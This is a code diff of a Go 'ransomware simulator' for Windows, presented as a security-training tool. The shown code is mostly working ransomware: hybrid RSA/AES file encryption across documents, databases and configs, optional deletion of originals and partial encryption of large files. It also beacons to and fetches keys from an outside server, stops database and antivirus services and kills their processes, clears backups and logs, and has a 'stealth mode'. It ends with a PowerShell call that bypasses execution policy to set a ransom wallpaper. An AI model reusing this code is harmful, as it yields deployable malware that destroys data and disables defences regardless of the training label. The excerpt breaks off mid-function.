@@ -1,4 +1,4 @@
-// ransom_simulator_windows.go - Windows专用版本（增强版）带日志功能
+// ransom_simulator_windows.go
 package main
 
 import (
@@ -9,11 +9,14 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
+	_ "embed"
+	"encoding/binary"
 	"encoding/json"
 	"encoding/pem"
 	"flag"
 	"fmt"
 	"io"
+	mrand "math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -23,97 +26,61 @@ import (
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
+	"unsafe"
 )
 
 const (
-	version   = "v3.2-Windows"
+	version   = "v3.6"
 	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
 	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
+
+	largeFileThreshold = 1 * 1024 * 1024 * 1024
+	chunkSize          = 1 * 1024 * 1024
+	headChunks         = 1
+	tailChunks         = 1
+	middleRandomChunks = 5
 )
 
 const ransomNoteContent = `
-================================================================================
-   !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
-================================================================================
+   [ 安全培训模拟演练通知 ]
 
-[ WARNING: Read the following carefully, or you may lose your data permanently ]
-[ 警告：请仔细阅读以下内容，否则您可能永久丢失数据 ]
-
---------------------------------------------------------------------------------
-ENGLISH version
---------------------------------------------------------------------------------
-
-Q: What happened?
-A: Your computers and servers have been locked by our security software. All your important files (including documents, photos, databases, SQL, backups, etc.) have been encrypted with strong algorithms. It is technically impossible to decrypt them without the private key held by us.
-
-Attempts to modify or rename encrypted files may result in permanent data corruption.
-
-Q: How to restore my files?
-A: The only way to restore files is to purchase the decryption tool and private key from us.
-
-1. Download and install Tor Browser (https://www.torproject.org/).
-2. Visit our recovery page: [onion_address_placeholder]
-3. Enter your unique Personal ID: %s
-
-Payment Terms:
-You must pay the ransom in Bitcoin. The price depends on how quickly you contact us.
-- If you contact us within 72 hours, the price is: $X,XXX USD (BTC equivalent).
-- If over 72 hours, the price will double.
-- If we do not receive payment within 7 days, your decryption key will be deleted, and data will be lost permanently.
-
-Free Decryption Test:
-To prove that we can recover your files, you can send us 2 small non-important files (less than 1MB), and we will decrypt them for free.
-
-Do not attempt to decrypt it yourself or use third-party software; this will cause permanent data loss.
-
---------------------------------------------------------------------------------
-中文版本 (Chinese Version)
---------------------------------------------------------------------------------
+您的部分文件已被程序处理（锁定）。
 
 问：发生了什么？
-答：您的计算机和服务器已被我们的安全软件锁定。您所有的重要文件（包括文档、照片、数据库、SQL、备份等）都已被高强度算法加密。如果不使用我们持有的私钥，这在技术上是无法解密的。
-
-试图修改或重命名加密文件可能会导致数据永久损坏。
+答：这是一个受控的安全培训模拟演练。您的计算机中部分重要文件（包括文档、
+照片、数据库、备份等）已被模拟处理（锁定）。在真实攻击场景中，如果没有
+攻击者持有的私钥，这些文件将无法恢复。
 
 问：如何恢复我的文件？
-答：恢复文件的唯一方法是从我们这里购买解密工具和私钥。
+答：请通过以下方式获取恢复工具和密钥：
 
-1. 下载并安装 Tor 浏览器 (https://www.torproject.org/).
-2. 访问我们的恢复页面: [此处为模拟的 .onion 地址]
-3. 输入您的唯一个人ID: %s
+1. 访问模拟恢复页面: https://encrypt.yangzifun.org/
+2. 输入您的唯一个人ID: %s
 
-付款条款：
-您必须以比特币（Bitcoin）支付赎金。
-价格取决于您与其联系的速度。
-- 如果在 72 小时内联系我们，价格为：$X,XXX USD (BTC 等值)
-- 如果超过 72 小时，价格将翻倍。
-- 如果我们在 7 天内没有收到付款，您的解密密钥将被删除，数据将永久丢失。
+本程序不会对原文件进行删除操作。如遇原文件丢失，可通过上方链接获取私钥及恢复程序。
 
-免费解密测试：
-为了证明我们可以恢复您的文件，您可以发送 2 个非重要的小文件（小于 1MB）给我们，我们将免费为您解密。
+[!] 这是一次安全培训模拟演练 [!]
 
-切勿尝试自行解密或使用第三方软件，这会导致数据永久丢失。
+不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络
+已经被完全攻陷。请借此机会评估和加强您的安全防护措施。
 
-[攻击者组织名称/签名]
+项目仓库链接：https://git.yangzifun.org/YZFN/ransom_simulator
 
-====================== [ 这是一次用于安全培训的模拟 ] ======================
-
-不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络已经被完全攻陷。
-本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥及解密程序：
-https://encrypt.yangzifun.org/
-获取私钥ID是: %s
-
-项目链接：https://github.com/yangzifun/ransom_simulator
-免责声明与许可
-本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
-再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。
+免责声明与许可：
+本项目遵循 MIT 许可证，请查阅 LICENSE 文件了解详情。
+此工具的创建旨在赋能防御者，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。
 
 `
 
+//go:embed wallpaper.ps1
+var wallpaperScript string
+
 var (
-	lockFilePath       string
-	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
+	lockFilePath            string
+	ransomNoteFileName      = "!!!_如何解密你的文件_!!!.txt"
+	ransomWallpaperFileName = "ransom_wallpaper.png"
 
 	// 日志相关变量
 	logEnabled        bool
@@ -133,6 +100,13 @@ var (
 	// 公钥变量
 	publicKeyPEM string
 
+	// 阶段2行为控制变量
+	stealthMode     bool
+	noStopServices  bool
+	noKillProcs     bool
+	noClearLogs     bool
+	aggressiveDelay int
+
 	// 目标进程列表
 	targetProcessesWindows = []string{
 		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
@@ -140,7 +114,7 @@ var (
 		"thunderbird.exe", "steam.exe", "code.exe", "powershell.exe", "cmd.exe",
 		// 数据库相关进程
 		"sqlwriter.exe", "sqlbrowser.exe", "mysql.exe", "pg_ctl.exe", "mongod.exe",
-		"redis-server.exe", "oracle.exe", "sqlplus.exe",
+		"redis-server.exe", "sqlplus.exe",
 		// 安全软件进程
 		"mcshield.exe", "avp.exe", "bdagent.exe", "SophosUI.exe", "SEP.exe",
 		"avastui.exe", "avgui.exe", "kav.exe", "kis.exe",
@@ -174,6 +148,8 @@ var (
 		// 文档文件
 		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
 		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub", ".one",
+		// 网页文件
+		".html", ".htm", ".xhtml", ".mht", ".mhtml",
 		// 压缩文件
 		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
 		// 图片文件
@@ -183,7 +159,7 @@ var (
 		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
 		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
 		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
-		".wal", ".journal", ".rdb", ".aof", ".dump", ".backup",
+		".wal", ".journal", ".rdb", ".aof", ".dump",
 		// 配置文件
 		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
 		".properties", ".env", ".toml", ".config",
@@ -215,6 +191,9 @@ var (
 		"C:\\Oracle\\oradata",
 		"D:\\Oracle\\oradata",
 	}
+
+	// 加密随机数读取器
+	cryptoReader = rand.Reader
 )
 
 type APIResponse struct {
@@ -234,11 +213,23 @@ type counters struct {
 	failed  atomic.Uint64
 }
 
+type encryptedChunk struct {
+	Offset int64  `json:"offset"`
+	Size   int    `json:"size"`
+	Nonce  []byte `json:"nonce"`
+	Data   []byte `json:"data"`
+}
+
+type chunkInfo struct {
+	Offset int64
+	Size   int64
+}
+
 func main() {
 	forceReleaseLock()
 
 	fmt.Println("==================================================")
-	fmt.Println("      勒索软件模拟器 - Windows增强版（API优先+本地回退）")
+	fmt.Println("      勒索软件模拟器 - Windows增强版      ")
 	fmt.Printf("                版本: %s\n", version)
 	fmt.Println("==================================================")
 	time.Sleep(1 * time.Second)
@@ -256,13 +247,18 @@ func main() {
 	defer cleanupLockFile()
 
 	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
-	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag := setupFlags(fs)
+	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag, stealthFlag, noStopSvcFlag, noKillFlag, noClearFlag, delayFlag := setupFlags(fs)
 	if err := fs.Parse(os.Args[1:]); err != nil {
 		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
 		os.Exit(1)
 	}
 
-	// 初始化日志系统
+	stealthMode = *stealthFlag
+	noStopServices = *noStopSvcFlag
+	noKillProcs = *noKillFlag
+	noClearLogs = *noClearFlag
+	aggressiveDelay = *delayFlag
+
 	initLogging(*logFlag)
 	defer closeLogFiles()
 
@@ -273,16 +269,36 @@ func main() {
 	} else {
 		go networkBeacon()
 
-		// 新增功能：停止Windows服务
-		fmt.Println("\n[+] 停止数据库和安全服务...")
-		stopWindowsServices()
+		if !noStopServices {
+			fmt.Println("\n[+] 停止数据库和安全服务...")
+			stopWindowsServices()
+			stopSecurityServices()
+		} else {
+			fmt.Println("\n[*] [跳过] 停止服务操作")
+		}
 
-		// 新增功能：清理数据库内存和缓存
 		fmt.Println("\n[+] 清理数据库内存和缓存...")
 		cleanWindowsDatabaseMemory()
+		cleanDatabaseMemory()
 
-		killLockingProcesses()
-		simulateDestructiveActions()
+		if !noKillProcs {
+			killLockingProcesses()
+		} else {
+			fmt.Println("\n[*] [跳过] 终止占用文件的进程")
+		}
+
+		if !noClearLogs {
+			simulateDestructiveActions()
+		} else {
+			fmt.Println("\n[*] [跳过] 清除备份和日志文件")
+		}
+
+		if stealthMode {
+			fmt.Println("\n[+] [隐身模式] 执行额外清理...")
+			disableProcessWatchdogs()
+			unmountDatabaseConnections()
+			clearSystemCache()
+		}
 	}
 
 	extFilter := make(map[string]bool)
@@ -347,13 +363,13 @@ func main() {
 
 	if !*dryRunFlag {
 		fmt.Println("\n[阶段 4: 勒索信增强]")
-		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID, finalUUID)
+		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID)
 		userProfile, err := os.UserHomeDir()
 		if err == nil {
 			desktopPath := filepath.Join(userProfile, "Desktop")
 			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
 		}
-		createRansomWallpaper()
+		createRansomWallpaper(finalUUID)
 	}
 
 	fmt.Println("\n================== [ 任务完成 ] ==================")
@@ -837,13 +853,18 @@ func cleanupLockFile() {
 	}
 }
 
-func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) {
+func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool, *bool, *bool, *bool, *bool, *int) {
 	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
 	dryRun := fs.Bool("dry-run", false, "演习模式")
 	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
 	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
 	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
 	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")
+	stealthFlag := fs.Bool("stealth-mode", false, "隐身模式：执行额外清理操作")
+	noStopSvcFlag := fs.Bool("no-stop-services", false, "跳过停止服务操作")
+	noKillFlag := fs.Bool("no-kill-procs", false, "跳过终止进程操作")
+	noClearFlag := fs.Bool("no-clear-logs", false, "跳过清除日志操作")
+	delayFlag := fs.Int("aggressive-delay", 0, "操作间随机延迟上限（毫秒），0=无延迟")
 
 	fs.Usage = func() {
 		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
@@ -855,9 +876,15 @@ func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) 
 		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
+		_, _ = fmt.Fprintf(os.Stderr, "行为控制:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --stealth-mode:       隐身模式，执行额外清理\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --no-stop-services:   跳过停止数据库和安全服务\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --no-kill-procs:      跳过终止占用文件的进程\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --no-clear-logs:      跳过清除备份和日志文件\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --aggressive-delay:   操作间随机延迟上限（毫秒）\n")
 		fs.PrintDefaults()
 	}
-	return workers, dryRun, extensions, directory, removeOriginal, logFlag
+	return workers, dryRun, extensions, directory, removeOriginal, logFlag, stealthFlag, noStopSvcFlag, noKillFlag, noClearFlag, delayFlag
 }
 
 func showWarning(dryRun bool) {
@@ -887,9 +914,16 @@ func networkBeacon() {
 	client := http.Client{Timeout: 5 * time.Second}
 	resp, err := client.Get(beaconURL)
 	if err != nil {
+		if logEnabled {
+			logOperation(fmt.Sprintf("Beacon check-in 失败: %v", err))
+		}
 		return
 	}
 	defer func() { _ = resp.Body.Close() }()
+
+	if logEnabled {
+		logOperation(fmt.Sprintf("Beacon check-in 完成, 状态码: %d", resp.StatusCode))
+	}
 }
 
 func simulateDestructiveActions() {
@@ -941,22 +975,122 @@ func simulateDestructiveActions() {
 	time.Sleep(1 * time.Second)
 }
 
-func createRansomWallpaper() {
-	fmt.Println("[*] Windows壁纸修改功能(模拟)")
+// ===================== 桌面壁纸（Win32 原生调用） =====================
+
+const (
+	spiSetDeskWallpaper = 0x0014
+	spifUpdateIniFile   = 0x0001
+	spifSendChange      = 0x0002
+)
+
+var (
+	user32dll = syscall.NewLazyDLL("user32.dll")
+	procSPI   = user32dll.NewProc("SystemParametersInfoW")
+)
+
+// applyDesktopWallpaper 调用 Win32 API 立即刷新桌面壁纸
+func applyDesktopWallpaper(path string) error {
+	p, err := syscall.UTF16PtrFromString(path)
+	if err != nil {
+		return err
+	}
+	ret, _, callErr := procSPI.Call(spiSetDeskWallpaper, 0, uintptr(unsafe.Pointer(p)), spifUpdateIniFile|spifSendChange)
+	if ret == 0 {
+		return fmt.Errorf("SystemParametersInfoW 调用失败: %v", callErr)
+	}
+	return nil
+}
+
+// readDesktopWallpaperReg 读取 HKCU\Control Panel\Desktop\Wallpaper 的当前值
+func readDesktopWallpaperReg() (string, error) {
+	out, err := exec.Command("reg", "query", `HKCU\Control Panel\Desktop`, "/v", "Wallpaper").Output()
+	if err != nil {
+		return "", err
+	}
+	for _, line := range strings.Split(string(out), "\n") {
+		if idx := strings.Index(line, "REG_SZ"); idx >= 0 {
+			return strings.TrimSpace(line[idx+len("REG_SZ"):]), nil
+		}
+	}
+	return "", fmt.Errorf("未找到 Wallpaper 注册表值")
+}
+
+// createRansomWallpaper 生成勒索提示壁纸并设置为当前用户桌面壁纸
+func createRansomWallpaper(uuid string) {
+	fmt.Println("[*] 生成并设置勒索提示壁纸...")
 
 	if logEnabled {
-		logOperation("尝试修改壁纸")
+		logOperation("开始生成勒索提示壁纸")
 	}
 
-	// 尝试修改Windows壁纸
-	wallpaperCommands := []string{
-		`reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg" /f`,
-		`powershell -Command "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value 'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg'"`,
+	// 优先输出到程序所在目录，不可用时回退到用户桌面
+	outPath := filepath.Join(programDir, ransomWallpaperFileName)
+	if _, err := os.Stat(programDir); err != nil {
+		if home, herr := os.UserHomeDir(); herr == nil {
+			outPath = filepath.Join(home, "Desktop", ransomWallpaperFileName)
+		}
 	}
 
-	for _, cmdStr := range wallpaperCommands {
-		cmd := exec.Command("cmd", "/C", cmdStr)
-		_ = cmd.Run()
+	// 使用内嵌脚本生成图片：直接调用 powershell，避免 cmd /C 的参数转义问题
+	script := fmt.Sprintf("& {%s} -OutPath '%s' -Uuid '%s'",
+		strings.TrimSpace(wallpaperScript),
+		strings.ReplaceAll(outPath, "'", "''"),
+		strings.ReplaceAll(uuid, "'", "''"))
+
+	if out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script).CombinedOutput(); err != nil {
+		fmt.Printf("[!] 生成壁纸失败: %v (%s)\n", err, strings.TrimSpace(string(out)))
+		if logEnabled {
+			logOperation(fmt.Sprintf("生成壁纸失败: %v", err))
+		}
+		return
+	}
+
+	if _, err := os.Stat(outPath); err != nil {
+		fmt.Printf("[!] 壁纸文件未生成: %s (%v)\n", outPath, err)
+		if logEnabled {
+			logOperation(fmt.Sprintf("壁纸文件未生成: %v", err))
+		}
+		return
+	}
+	fmt.Printf("[+] 壁纸已生成: %s\n", outPath)
+
+	// 注册表指向生成的图片，并设置为填充样式
+	regCommands := [][]string{
+		{"add", `HKCU\Control Panel\Desktop`, "/v", "Wallpaper", "/t", "REG_SZ", "/d", outPath, "/f"},
+		{"add", `HKCU\Control Panel\Desktop`, "/v", "WallpaperStyle", "/t", "REG_SZ", "/d", "10", "/f"},
+		{"add", `HKCU\Control Panel\Desktop`, "/v", "TileWallpaper", "/t", "REG_SZ", "/d", "0", "/f"},
+	}
+	for _, args := range regCommands {
+		if err := exec.Command("reg", args...).Run(); err != nil {
+			fmt.Printf("[!] 写入壁纸注册表失败: %v\n", err)
+			if logEnabled {
+				logOperation(fmt.Sprintf("写入壁纸注册表失败: %v", err))
+			}
+		}
+	}
+
+	// 回读注册表，确认壁纸路径已写入
+	if got, err := readDesktopWallpaperReg(); err != nil {
+		fmt.Printf("[!] 读取壁纸注册表失败: %v\n", err)
+	} else if !strings.EqualFold(got, outPath) {
+		fmt.Printf("[!] 壁纸注册表未按预期更新: 期望 %s, 实际 %s\n", outPath, got)
+		if logEnabled {
+			logOperation(fmt.Sprintf("壁纸注册表未按预期更新: 期望 %s, 实际 %s", outPath, got))
+		}
+	}
+
+	// 调用 Win32 API 立即刷新壁纸（SPIF_UPDATEINIFILE | SPIF_SENDCHANGE）
+	if err := applyDesktopWallpaper(outPath); err != nil {
+		fmt.Printf("[!] 刷新壁纸失败: %v\n", err)
+		if logEnabled {
+			logOperation(fmt.Sprintf("刷新壁纸失败: %v", err))
+		}
+		return
+	}
+
+	fmt.Printf("[+] 壁纸已设置为: %s\n", outPath)
+	if logEnabled {
+		logOperation("壁纸设置完成: " + outPath)
 	}
 }
 
@@ -1003,7 +1137,7 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 			if encryptAllFormats {
 				shouldProcess = true
 				fileName := filepath.Base(path)
-				if fileName == ransomNoteFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
+				if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
 					shouldProcess = false
 				}
 			} else {
@@ -1066,14 +1200,13 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 		fmt.Printf("失败: %v\n", parseErr)
 		fmt.Println("[!] 公钥格式错误，程序终止")
 		os.Exit(1)
-	} else {
-		fmt.Println("成功")
-		// 存储解析后的公钥到缓存
-		publicKeyCache = pubKey
-		publicKeyCacheStr = publicKeyPEM
 	}
+	fmt.Println("成功")
+	// 存储解析后的公钥到缓存
+	publicKeyCache = pubKey
+	publicKeyCacheStr = publicKeyPEM
 
-	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, uuid, uuid)
+	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid)
 	var visitedDirs sync.Map
 
 	log, err3 := newFileLog("ransom_log.txt")
@@ -1131,7 +1264,7 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 				processed := stats.success.Load() + stats.failed.Load()
 				if totalFiles > 0 {
 					progress := float64(processed) / float64(totalFiles) * 100
-					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
+					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d) [成功: %d, 失败: %d]", progress, processed, totalFiles, stats.success.Load(), stats.failed.Load())
 				}
 			}
 		}
@@ -1161,4 +1294,468 @@ func fetchKeysFromAPI() (*APIResponse, error) {
 	if err != nil {
 		return nil, fmt.Errorf("请求API失败: %w", err)
 	}
-	defer func
+	defer func() { _ = res.Body.Close() }()
+
+	if res.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("API返回错误状态码: %d", res.StatusCode)
+	}
+
+	body, err := io.ReadAll(res.Body)
+	if err != nil {
+		return nil, fmt.Errorf("读取API响应失败: %w", err)
+	}
+
+	var apiResp APIResponse
+	if err := json.Unmarshal(body, &apiResp); err != nil {
+		return nil, fmt.Errorf("解析API响应失败: %w", err)
+	}
+
+	if apiResp.Status != "success" {
+		return nil, fmt.Errorf("API返回非成功状态: %s - %s", apiResp.Status, apiResp.Message)
+	}
+
+	if apiResp.PublicKeyPEM == "" || apiResp.UUID == "" {
+		return nil, fmt.Errorf("API返回的密钥或UUID为空")
+	}
+
+	return &apiResp, nil
+}
+
+// processFile 加密单个文件
+func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
+	info, err := os.Stat(filePath)
+	if err != nil {
+		return fmt.Errorf("获取文件信息失败: %w", err)
+	}
+
+	fileSize := info.Size()
+	if fileSize > largeFileThreshold {
+		return partialEncryptFile(filePath, publicKeyStr, fileSize)
+	}
+
+	content, err := os.ReadFile(filePath)
+	if err != nil {
+		return fmt.Errorf("读取文件失败: %w", err)
+	}
+
+	if len(content) == 0 {
+		return fmt.Errorf("文件为空，跳过加密: %s", filePath)
+	}
+
+	encryptedData, err := hybridEncrypt(content, publicKeyStr)
+	if err != nil {
+		return fmt.Errorf("加密失败: %w", err)
+	}
+
+	encryptedPath := filePath + ".encrypted"
+	if err := os.WriteFile(encryptedPath, encryptedData, 0644); err != nil {
+		return fmt.Errorf("写入加密文件失败: %w", err)
+	}
+
+	if removeOriginal {
+		if err := os.Remove(filePath); err != nil {
+			trashName := filePath + ".delete_me_" + generateRandomSuffix()
+			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
+				return fmt.Errorf("删除原文件失败(文件被锁定): %w", renameErr)
+			}
+		}
+	}
+
+	return nil
+}
+
+// shouldEncrypt 判断文件是否应根据扩展名过滤进行加密
+func shouldEncrypt(path string, extFilter map[string]bool) bool {
+	fileName := filepath.Base(path)
+	ext := strings.ToLower(filepath.Ext(fileName))
+
+	if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(ext, ".encrypted") {
+		return false
+	}
+
+	return extFilter[ext]
+}
+
+// isExcluded 判断目录是否在排除列表中（Windows版本）
+func isExcluded(dir string) bool {
+	dirLower := strings.ToLower(dir)
+	for _, excluded := range excludedDirsWindows {
+		if strings.HasPrefix(dirLower, strings.ToLower(excluded)) {
+			return true
+		}
+	}
+	return false
+}
+
+// getKeys 从map中提取所有key
+func getKeys(m map[string]bool) []string {
+	keys := make([]string, 0, len(m))
+	for k := range m {
+		keys = append(keys, k)
+	}
+	return keys
+}
+
+// hybridEncrypt 使用RSA-2048 + AES-256-GCM混合加密
+func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
+	pubKey, err := getPublicKey(publicKeyStr)
+	if err != nil {
+		return nil, fmt.Errorf("获取公钥失败: %w", err)
+	}
+
+	aesKey := make([]byte, 32)
+	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
+		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
+	}
+
+	block, err := aes.NewCipher(aesKey)
+	if err != nil {
+		return nil, fmt.Errorf("创建AES cipher失败: %w", err)
+	}
+
+	aesGCM, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, fmt.Errorf("创建GCM模式失败: %w", err)
+	}
+
+	nonce := make([]byte, aesGCM.NonceSize())
+	if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
+		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
+	}
+
+	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)
+
+	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
+	if err != nil {
+		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
+	}
+
+	var buffer bytes.Buffer
+	buffer.Write(encryptedAESKey)
+	buffer.Write(nonce)
+	buffer.Write(ciphertext)
+
+	return buffer.Bytes(), nil
+}
+
+// generateRandomSuffix 生成8位随机十六进制后缀
+func generateRandomSuffix() string {
+	b := make([]byte, 4)
+	_, _ = cryptoReader.Read(b)
+	return fmt.Sprintf("%x", b)
+}
+
+// newFileLog 创建文件日志对象
+func newFileLog(filename string) (*fileLog, error) {
+	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return nil, err
+	}
+	return &fileLog{file: f}, nil
+}
+
+// Log 写入日志条目
+func (l *fileLog) Log(message string) {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+	if l.file != nil {
+		logLine := fmt.Sprintf("%s - %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
+		_, _ = l.file.WriteString(logLine)
+	}
+}
+
+// Close 关闭日志文件
+func (l *fileLog) Close() error {
+	if l.file != nil {
+		return l.file.Close()
+	}
+	return nil
+}
+
+func partialEncryptFile(filePath string, publicKeyStr string, fileSize int64) error {
+	fmt.Printf("\n  [大文件] %s (大小: %.2f GB) - 使用部分加密策略\n",
+		filepath.Base(filePath), float64(fileSize)/(1024*1024*1024))
+
+	pubKey, err := getPublicKey(publicKeyStr)
+	if err != nil {
+		return fmt.Errorf("获取公钥失败: %w", err)
+	}
+
+	aesKey := make([]byte, 32)
+	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
+		return fmt.Errorf("生成AES密钥失败: %w", err)
+	}
+
+	chunks := calculateChunks(fileSize)
+	var encryptedChunks []encryptedChunk
+
+	f, err := os.OpenFile(filePath, os.O_RDONLY, 0644)
+	if err != nil {
+		return fmt.Errorf("打开文件失败: %w", err)
+	}
+	defer f.Close()
+
+	for _, chunk := range chunks {
+		buf := make([]byte, chunk.Size)
+		n, err := f.ReadAt(buf, chunk.Offset)
+		if err != nil && err != io.EOF {
+			return fmt.Errorf("读取文件块失败(offset=%d): %w", chunk.Offset, err)
+		}
+		buf = buf[:n]
+
+		block, err := aes.NewCipher(aesKey)
+		if err != nil {
+			return fmt.Errorf("创建AES cipher失败: %w", err)
+		}
+
+		aesGCM, err := cipher.NewGCM(block)
+		if err != nil {
+			return fmt.Errorf("创建GCM模式失败: %w", err)
+		}
+
+		nonce := make([]byte, aesGCM.NonceSize())
+		if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
+			return fmt.Errorf("生成GCM nonce失败: %w", err)
+		}
+
+		ciphertext := aesGCM.Seal(nil, nonce, buf, nil)
+
+		encryptedChunks = append(encryptedChunks, encryptedChunk{
+			Offset: chunk.Offset,
+			Size:   len(buf),
+			Nonce:  nonce,
+			Data:   ciphertext,
+		})
+	}
+
+	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
+	if err != nil {
+		return fmt.Errorf("RSA加密AES密钥失败: %w", err)
+	}
+
+	chunksJSON, err := json.Marshal(encryptedChunks)
+	if err != nil {
+		return fmt.Errorf("序列化加密块信息失败: %w", err)
+	}
+
+	var outputBuf bytes.Buffer
+	outputBuf.Write([]byte("PENC"))
+
+	chunkLen := make([]byte, 4)
+	binary.BigEndian.PutUint32(chunkLen, uint32(len(chunksJSON)))
+	outputBuf.Write(chunkLen)
+	outputBuf.Write(chunksJSON)
+
+	keyLen := make([]byte, 4)
+	binary.BigEndian.PutUint32(keyLen, uint32(len(encryptedAESKey)))
+	outputBuf.Write(keyLen)
+	outputBuf.Write(encryptedAESKey)
+
+	for _, ec := range encryptedChunks {
+		outputBuf.Write(ec.Data)
+	}
+
+	encryptedPath := filePath + ".encrypted"
+	if err := os.WriteFile(encryptedPath, outputBuf.Bytes(), 0644); err != nil {
+		return fmt.Errorf("写入加密文件失败: %w", err)
+	}
+
+	return nil
+}
+
+func calculateChunks(fileSize int64) []chunkInfo {
+	var chunks []chunkInfo
+
+	for i := int64(0); i < headChunks && i*chunkSize < fileSize; i++ {
+		sz := chunkSize
+		if (i+1)*chunkSize > fileSize {
+			sz = int(fileSize - i*chunkSize)
+		}
+		chunks = append(chunks, chunkInfo{Offset: i * chunkSize, Size: int64(sz)})
+	}
+
+	for i := int64(0); i < tailChunks; i++ {
+		offset := fileSize - (i+1)*chunkSize
+		if offset < 0 {
+			offset = 0
+		}
+		sz := fileSize - offset
+		if sz > chunkSize {
+			sz = chunkSize
+		}
+		isDuplicate := false
+		for _, c := range chunks {
+			if c.Offset == offset {
+				isDuplicate = true
+				break
+			}
+		}
+		if !isDuplicate {
+			chunks = append(chunks, chunkInfo{Offset: offset, Size: sz})
+		}
+	}
+
+	if fileSize > int64(headChunks+tailChunks)*chunkSize {
+		availableStart := int64(headChunks) * chunkSize
+		availableEnd := fileSize - int64(tailChunks)*chunkSize
+		availableRange := availableEnd - availableStart
+
+		if availableRange > 0 {
